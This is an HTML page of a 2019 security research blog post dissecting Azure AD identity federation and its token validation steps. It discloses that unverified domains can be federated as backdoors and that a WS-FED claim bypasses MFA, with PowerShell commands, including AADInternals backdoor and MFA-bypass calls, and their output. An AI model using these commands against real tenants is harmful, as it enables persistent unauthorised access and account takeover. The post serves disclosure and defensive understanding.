@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="cache-control" content="no-cache"> 
+<meta http-equiv="expires" content="0"> 
+<meta http-equiv="pragma" content="no-cache">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deep-dive to Azure Active Directory Identity Federation</title>
+<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
+<meta name="generator" content="Hugo 0.39" />
+<meta property="og:title" content="Deep-dive to Azure Active Directory Identity Federation" />
+<meta property="og:description" content="Identity federation is regarded as the most secure way to authenticate users to Azure AD. In this blog, I’ll deep-dive to identity federation implementation of Azure AD and point out some serious security issues.
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://o365blog.com/post/aad-deepdive/" />
+
+
+
+<meta property="article:published_time" content="2019-06-12T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2019-10-30T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="//fonts.googleapis.com" />
+<link rel="dns-prefetch" href="//fonts.gstatic.com" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
+<script type="text/javascript" src="/js/scripts.js"></script>
+<script type="text/javascript" src="/js/tools.js"></script>
+
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
+<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
+<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
+<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
+<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
+<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
+<meta name="application-name" content="&nbsp;"/>
+<meta name="msapplication-TileColor" content="#FFFFFF" />
+<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
+<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
+<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
+<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
+<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-61454000-4', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+</head>
+<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+	<div class="container container-outer">
+		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
+		
+			<div class="container container-inner clearfix">
+			
+				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
+				
+					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
+						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
+						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
+					</a>
+				</div>
+			</div>
+			
+<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<ul class="menu__list">
+		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
+		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
+		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
+	</ul>
+</nav>
+
+		</header>
+		<div class="wrapper clearfix">
+
+<main class="main-content content" role="main" itemprop="mainContentOfPage">
+	<article class="post">
+		<header class="post__header clearfix">
+			<h1 class="post__title">Deep-dive to Azure Active Directory Identity Federation</h1>
+			<p class="post__meta meta">
+				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
+				<time class="post__meta-date" datetime="2019-06-12T00:00:00">June 12, 2019</time>
+					<time class="post__meta-lastmod" datetime="2019-10-30T00:00:00"> (Last Modified: October 30, 2019)</time>
+				<span class="post__meta-categories meta-categories">
+					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
+					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
+			</p>
+			<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2faad-deepdive%2f&text=Deep-dive%20to%20Azure%20Active%20Directory%20Identity%20Federation&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2faad-deepdive%2f&mini=true&title=Deep-dive%20to%20Azure%20Active%20Directory%20Identity%20Federation&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+		</header>
+		<div class="post__content clearfix">
+			<figure class="post__thumbnail">
+				<img src="/images/posts/aad_deepdive.png" alt="Deep-dive to Azure Active Directory Identity Federation">
+			</figure>
+				<nav id="TableOfContents">
+<ul>
+<li><a href="#introduction">Introduction</a>
+<ul>
+<li><a href="#what-is-identity-federation">What is Identity Federation</a></li>
+<li><a href="#protocols">Protocols</a></li>
+<li><a href="#authentication-flows">Authentication flows</a></li>
+</ul></li>
+<li><a href="#azure-ad-identity-federation-under-the-hood">Azure AD Identity Federation under-the-hood</a>
+<ul>
+<li><a href="#1-check-the-syntax">1. Check the syntax</a></li>
+<li><a href="#2-syntax-valid">2. Syntax valid?</a></li>
+<li><a href="#3-find-the-federation-realm">3. Find the federation realm</a></li>
+<li><a href="#4-realm-found">4. Realm found?</a></li>
+<li><a href="#5-public-key-matches-the-realm">5. Public key matches the realm?</a></li>
+<li><a href="#6-check-the-signature">6. Check the signature</a></li>
+<li><a href="#7-is-the-signature-valid">7. Is the signature valid?</a></li>
+<li><a href="#8-search-the-user">8. Search the user</a></li>
+<li><a href="#9-user-found">9. User found?</a></li>
+<li><a href="#10-log-the-user-in">10. Log the user in</a></li>
+</ul></li>
+</ul>
+</nav>
+			<p>Identity federation is regarded as the most secure way to authenticate users to Azure AD. In this blog, I’ll deep-dive to identity federation implementation of Azure AD and point out some serious security issues.</p>
+
+<p></p>
+
+<h1 id="introduction">Introduction</h1>
+
+<h2 id="what-is-identity-federation">What is Identity Federation</h2>
+
+<p>Identity federation, in general, refers to a situation, where the <strong>service provider (SP)</strong> trusts to identities provided by an <strong>identity provider (IdP)</strong>.
+Technically, the IdP provides a <strong>security token (ST)</strong> which contains information about the user. ST is signed by IdP using a private key of the agreed-upon certificate.
+The SP verifies the ST using the public key of the agreed-upon certificate.</p>
+
+<h2 id="protocols">Protocols</h2>
+
+<p>There are two commonly used federation protocols: <strong>Web Services Federation Language (WS-Federation)</strong> and <strong>Security Assertion Markup Language (SAML)</strong>.
+WS-Federation is purely a protocol, whereas SAML is both protocol and token type. For instance, Active Directory Federation Services (AD FS) is (by default)
+using WS-Federation protocol with SAML 1.1 tokens.</p>
+
+<h2 id="authentication-flows">Authentication flows</h2>
+
+<p>There are two different authentication flows: <strong>SP-initiated</strong> and <strong>IdP-initiated</strong>.</p>
+
+<p>The typically used <strong>SP-initiated</strong> authentication flow is illustrated in Figure 1. The steps are:</p>
+
+<ol>
+<li>The user tries to access SP using a browser</li>
+<li>SP sends a redirect to the user&rsquo;s browser</li>
+<li>The browser connects IdP and IdP performs an authentication</li>
+<li>After successful authentication, SP creates ST and redirects the browser back to SP</li>
+<li>The browser accesses SP</li>
+</ol>
+
+<p><img src="/images/posts/aad_sp2idp.png" alt="SP initiated" />
+<strong>Figure 1: SP-initiated authentication flow</strong></p>
+
+<p>The <strong>IdP-initiated</strong> authentication flow is illustrated in Figure 2. The steps are:</p>
+
+<ol>
+<li>The user connects to IdP with browser and IdP performs an authentication</li>
+<li>After successful authentication, SP creates ST and redirects the browser back to SP</li>
+<li>The browser accesses SP</li>
+</ol>
+
+<p><img src="/images/posts/aad_idp2sp.png" alt="IDP initiated" />
+<strong>Figure 2: IdP-initiated authentication flow</strong></p>
+
+<h1 id="azure-ad-identity-federation-under-the-hood">Azure AD Identity Federation under-the-hood</h1>
+
+<p>The Azure AD authentication flow for federated identities is illustrated in Figure 3.
+The process is the same for both SP (step 5) and IdP (step 3) initiated authentication flows.</p>
+
+<p>Azure AD supports two authentication protocols, SAMLP (SAML 2.0) and WSFED (WS-Federation). Next, the steps are explained in more detail.</p>
+
+<p><img src="/images/posts/aad_authflow.png" alt="The federation flow" />
+<strong>Figure 3: Azure AD identity federation IdP authentication flow</strong></p>
+
+<h2 id="1-check-the-syntax">1. Check the syntax</h2>
+
+<p>The first step of the authentication flow is to check the syntax of the authentication request.
+The authentication request is sent to <a href="https://login.microsoftonline.com/login.srf">https://login.microsoftonline.com/login.srf</a> using HTTP POST protocol. Required query parameters are listed in the following tables.</p>
+
+<p><a href="http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html" target=_blank">SAMLP</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>RelayState</td>
+<td>In SP initiated authentication, this parameter must be resent to SP unmodified. <br>With IdP initiated authentication can be left to empty.</td>
+</tr>
+
+<tr>
+<td>SAMLResponse</td>
+<td>Base 64 encoded signed SAML2 token.</td>
+</tr>
+</tbody>
+</table>
+
+<p><a href="http://docs.oasis-open.org/wsfed/federation/v1.2/cd/ws-federation-1.2-spec-cd-02.html" target=_blank">WSFED</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>wa</td>
+<td>This is the required parameter, and it specifies the action to be performed. <br>Must be “wsignin1.0”</td>
+</tr>
+
+<tr>
+<td>wctx</td>
+<td>This optional parameter is a context value. If set, must be returned with the issued token. <br>In SP initiated authentication this parameter must be resent to SP unmodified.<br>With IdP initiated authentication can be left to empty.</td>
+</tr>
+
+<tr>
+<td>wresult</td>
+<td>This required parameter specifies the result of the token issuance as signed SAML 1.1 token.</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="2-syntax-valid">2. Syntax valid?</h2>
+
+<p>If the syntax is valid the flow proceeds to the next step. If not, one of the following error codes are shown, and the authentication process is terminated.</p>
+
+<p><a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Error code</th>
+<th>Message</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>AADSTS20012</td>
+<td>WsFedMessageInvalid - There&rsquo;s an issue with your federated Identity Provider. Contact your IDP to resolve this issue.</td>
+<td>WSFED: The SAML token xml format was not valid. Missing tags etc.</td>
+</tr>
+
+<tr>
+<td>AADSTS90013</td>
+<td>InvalidUserInput - The input from the user is not valid.</td>
+<td>WSFED: wresult parameter missing.</td>
+</tr>
+
+<tr>
+<td>AADSTS90081</td>
+<td>OrgIdWsFederationMessageInvalid - An error occurred when the service tried to process a WS-Federation message. The message is not valid.</td>
+<td>WSFED: wa parameter missing.<br>SAMLP: SAMLResponse parameter missing.</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="3-find-the-federation-realm">3. Find the federation realm</h2>
+
+<p>Now the syntax of the authentication request is checked and found to be valid. Next step is to find the federation realm, i.e., the tenant to be authenticated to.</p>
+
+<p>Based on my research, the domain name is not used at all. Instead, Azure AD has a table of Azure AD federation realms having at least the following attributes.</p>
+
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Issuer</td>
+<td>A string, usually a URI, identifying the IdP. <br><br>The issuer is unique; it can be associated only to one tenant at any given time.</td>
+</tr>
+
+<tr>
+<td>Tenant</td>
+<td>String (GUID) of the tenant the issuer is associated with. <br> <br>The tenant can have multiple issuers.</td>
+</tr>
+
+<tr>
+<td>Signing certificate</td>
+<td>A base 64 encoded public key of the signing certificate. <br><br>Not unique, can be associated with multiple tenants and issuers.</td>
+</tr>
+</tbody>
+</table>
+
+<p>As we already know, the domains registered to Azure AD can be either <strong>Managed</strong> or <strong>Federated</strong>. When a domain is converted to federated, it is also added to the Azure AD Federation realms table.
+Normally, only validated domains can be used in Azure AD. This means that unless the domain is validated, it cannot be used as a login name or email address.</p>
+
+<p>However, I discovered a bug in Azure AD, which I reported to Microsoft on November 22nd 2018. <strong>The bug allows using unvalidated domains as backdoors</strong>.
+I finally got a response from Microsoft on Oct 25th 2019. So, this is also a feature and won&rsquo;t be fixed:</p>
+
+<blockquote>
+<p>Our team had assessed this issue, and this behavior is considered by design. Also, to exploit this, a user needs to have admin privileges.</p>
+</blockquote>
+
+<p><strong>Example 1:</strong> Creating a domain and changing the authentication method using MsOnline PowerShell module:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a new federated domain</span>
+<span class="nb">New-MsolDomain</span> <span class="n">-Name</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">com</span>
+
+<span class="c"># Save the issuer and login/logoff uri to variables</span>
+<span class="nv">$issuer</span><span class="p">=</span><span class="s2">&#34;http://myissuer/microsoft.com&#34;</span>
+<span class="nv">$uri</span><span class="p">=</span><span class="s2">&#34;http://myissuer&#34;</span>
+
+<span class="c"># Save the public key to a variable</span>
+<span class="nv">$certificate</span> <span class="p">=</span> <span class="s2">&#34;MIIDcTCCAligAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJmaTESMBAGA1UECAwJUGlya2FubWFhMREwDwYDVQQKDAhHZXJlbmlvczEcMBoGA1UEAwwTaGFjay5vMzY1ZG9tYWluLm9yZzAeFw0xODAyMjExMzEyNDVaFw0yODAyMTkxMzEyNDVaMFIxCzAJBgNVBAYTAmZpMRIwEAYDVQQIDAlQaXJrYW5tYWExETAPBgNVBAoMCEdlcmVuaW9zMRwwGgYDVQQDDBNoYWNrLm8zNjVkb21haW4ub3JnMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQIApH73Hcv30uHHve6Zd3E/aEeFgQRMZD/CJUQC2DfSk0mDX8X75MIo7gP+62ZTUsOxhSDdOOVYshK8Kyk9VZvo21A5hDcCudXxc/eifCdwGLalCaOQt8pdMlYJgsBDcieMNToCx2pXp1PvkJdKc2JiXQCIAolJySbNXGJbBG1Oh4tty7lEXUqHpHgqiIJCb64q64BIQpZr/WQG0QgtH/gwWYz7b/psNA4xVi8RJnRUl7I62+j0WVSTih2j3kK20j5OIW9Rk+5XoHJ5npOBM84pYJ6yxMz1sOdSqOccAjSVHWFKdM437PxAPeiXAXoBKczGZ72Q8ocz2YSLGKcSMnYCrhECAwEAAaNQME4wHQYDVR0OBBYEFNu32o5XSIQ0lvwB+d2cnTlrtk2PMB8GA1UdIwQYMBaAFNu32o5XSIQ0lvwB+d2cnTlrtk2PMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQENBQADggECAHokwTra0dlyG5jj08TiHlx1pJFnqlejjpFXaItuk2jEBfO/fv1AJaETSR5vupFfDHA337oPiqWugxai1TIvJGKhZImNloMj8lyeZk/9/5Pt2X4N8r1JpAQzt+Ez3z7aNrAFxRjJ0Y+rDDcSItZ5vaXJ5PqBvR7icjIBaXrHVFUC6OZ2RkebbpajbIdt6U/P7ovg7L1J6LAzL/asATZzM3Mjn+9rsC9xLbJwuEabLU+BxySsNo8TULYi9O2MSJ9FvddE6n3OPqrmldldCrb6OugK/pzCwjTnVgRtrHNJc+zKavbiu0Yfp8uYhvCCWAakdQ8g6ZNJ1TGSaYNIrpTIhXIJ&#34;</span>
+
+<span class="c"># Set the authentication method</span>
+<span class="nb">Set-MsolDomainAuthentication</span> <span class="n">-DomainName</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">com</span> <span class="n">-Authentication</span> <span class="n">Federated</span> <span class="n">-IssuerUri</span> <span class="nv">$issuer</span> <span class="n">-LogOffUri</span> <span class="nv">$uri</span> <span class="n">-PassiveLogOnUri</span> <span class="nv">$uri</span> <span class="n">-SigningCertificate</span> <span class="nv">$certificate</span> </code></pre></div></p>
+
+<p><strong>Example 2:</strong> Creating a domain and changing the authentication method using <a href="/aadinternals"" target="_blank">AADInternals</a> PowerShell module:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a new backdoor</span>
+<span class="nb">New-AADIntBackdoor</span> <span class="n">-DomainName</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">com</span></code></pre></div></p>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: yes
+
+Authentication     : Managed
+Capabilities       : None
+IsDefault          : false
+IsInitial          : false
+Name               : microsoft.com
+RootDomain         : 
+Status             : Unverified
+VerificationMethod : 
+
+Backdoor created. Domain: microsoft.com, issuer=http://any.sts/B231A11F
+</code></pre>
+
+<h2 id="4-realm-found">4. Realm found?</h2>
+
+<p>If the realm was found, the flow proceeds to the next step. If not, the following error is shown.</p>
+
+<p><a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Error code</th>
+<th>Message</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>AADSTS50107</td>
+<td>Requested federation realm object ‘issuer’ does not exist</td>
+<td>The issuer was not found. <br><br><strong>Note:</strong> If the domain is recently changed to federated, it can take up to 30 minutes for the change to take effect.</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="5-public-key-matches-the-realm">5. Public key matches the realm?</h2>
+
+<p>After finding the realm, the public key received in the authentication request is checked against the signing certificate of the realm. If they match, the authentication flow proceeds to the next step. If not, the following error is shown.</p>
+
+<p><a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Error code</th>
+<th>Message</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>AADSTS50008</td>
+<td>InvalidSamlToken - SAML assertion is missing or misconfigured in the token.</td>
+<td>WSFED: The signing certificate does not match the realm’s public key.</td>
+</tr>
+
+<tr>
+<td>AADSTS500081</td>
+<td>Unable to verify the token signature. The signing key identifier does not match any valid registered keys.</td>
+<td>SAMLP: The signing certificate does not match the realm’s public key.</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="6-check-the-signature">6. Check the signature</h2>
+
+<p>After checking that the public key matches, the signature of the SAML or SAML2 token are checked. Checking the signature allows Azure AD to make sure that the token is issued by the correct certificate, and that it is not tampered.</p>
+
+<h2 id="7-is-the-signature-valid">7. Is the signature valid?</h2>
+
+<p>If the signature is valid, authentication flow proceeds to the next step. If the signature is not valid, the following error is shown.</p>
+
+<p><a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Error code</th>
+<th>Message</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>AADSTS50008</td>
+<td>InvalidSamlToken - SAML assertion is missing or misconfigured in the token.</td>
+<td>WSFED: The signature is invalid: the content of the token might have been altered.</td>
+</tr>
+
+<tr>
+<td>AADSTS50006</td>
+<td>InvalidSignature - Signature verification failed because of an invalid signature</td>
+<td>SAMLP: The signature is invalid: the content of the token might have been altered.</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="8-search-the-user">8. Search the user</h2>
+
+<p>After the validity of the token is confirmed, the corresponding user object is searched from the tenant. The token contains the user’s UserPrincipalName and ImmutableId. <strong>Azure AD searches the user object using only the ImmutableId</strong>; the UserPrincipalName is not used at all. Thus, the UserPrincipalName can be any string, such as rudolf@santaclaus.com.</p>
+
+<p>The search procedure searches for a user object having the matching ImmutableId. I would like to emphasize that <strong>there are no sanity checks whether the user’s domain matches the federation realm</strong>. In practice, this allows all tenant’s IdPs to create valid tokens for any user of the tenant. This includes xxx.onmicrosoft.com and external users.</p>
+
+<h2 id="9-user-found">9. User found?</h2>
+
+<p>If the user object is found, the authentication flow proceeds to the final step. If not, the following error is shown.</p>
+
+<p><a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Error code</th>
+<th>Message</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>AADSTS51004</td>
+<td>UserAccountNotInDirectory - The user account doesn’t exist in the directory. <br><br>The user account &ldquo;ImmutableId&rdquo; does not exist in the &ldquo;tenant guid&rdquo; directory. To sign into this application, the account must be added to the directory.</td>
+<td>The user does not exist in the tenant.</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="10-log-the-user-in">10. Log the user in</h2>
+
+<p>The last step of the authentication flow is to log the user in.</p>
+
+<p>After the login, post-authentication steps, such as <strong>Multi-Factor Authentication (MFA)</strong> and Conditional Access Policies are applied.</p>
+
+<p>WS-FED token has a special functionality, which allows bypassing the MFA. This functionality is meant for the situation, where IdP performs MFA and the Azure AD MFA needs to be bypassed. This information is delivered to Azure AD using a special claim that can be embedded to WS-FED tokens. Azure AD bypasses MFA every time this claim is present in WS-FED token, regardless of has the IdP actually performed the MFA.</p>
+
+<p><strong>Example:</strong> Bypass the MFA using the backdoor created above in step 3.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Login and bypass MFA</span>
+<span class="n">Open-AADIntOffice365Portal</span> <span class="n">-ImmutableID</span> <span class="n">qIMPTm2Q3kimHgg4KQyveA</span><span class="p">==</span> <span class="n">-Issuer</span> <span class="s2">&#34;http://any.sts/B231A11F&#34;</span> <span class="n">-UseBuiltInCertificate</span> <span class="n">-ByPassMFA</span> <span class="nv">$true</span></code></pre></div></p>
+		</div>
+		
+<div class="post__tags tags clearfix">
+	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
+	
+	<ul class="tags__list">
+		<li class="tags__item"><a class="tags__link" href="/tags/office-365/" rel="tag">Office 365</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/identity/" rel="tag">Identity</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/federation/" rel="tag">Federation</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/sso/" rel="tag">SSO</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/adfs/" rel="tag">ADFS</a></li>
+	</ul>
+</div>
+
+		<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2faad-deepdive%2f&text=Deep-dive%20to%20Azure%20Active%20Directory%20Identity%20Federation&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2faad-deepdive%2f&mini=true&title=Deep-dive%20to%20Azure%20Active%20Directory%20Identity%20Federation&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+	</article>
+	
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
+	</div>
+	<div class="authorbox__description">
+		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
+	</div>
+</div>
+	
+<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<div class="post-nav__item post-nav__item--prev col-1-2">
+		<a class="post-nav__link" href="/post/long-passwords/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">How to create over 256 character long passwords for cloud-only users</p></a>
+	</div>
+	<div class="post-nav__item post-nav__item--next col-1-2">
+		<a class="post-nav__link" href="/post/bharsenal2019/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">AADInternals at Black Hat USA 2019 Arsenal!</p></a>
+	</div>
+</nav>
+
+	
+<div class="comments">
+	<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+</main>
+
+<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
+	
+<div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
+		<label>
+			<span class="screen-reader-text">Search for:</span>
+			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
+		</label>
+		<input class="widget-search__submit" type="submit" value="Search">
+		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
+	</form>
+</div>
+	
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
+		</ul>
+	</div>
+</div>
+
+	
+<div class="widget-categories widget">
+	<h4 class="widget__title">Categories</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
+		</ul>
+	</div>
+</div>
+	
+<div class="widget-social widget">
+	<h4 class="widget-social__title widget__title">Social</h4>
+	<div class="widget-social__content widget__content">
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
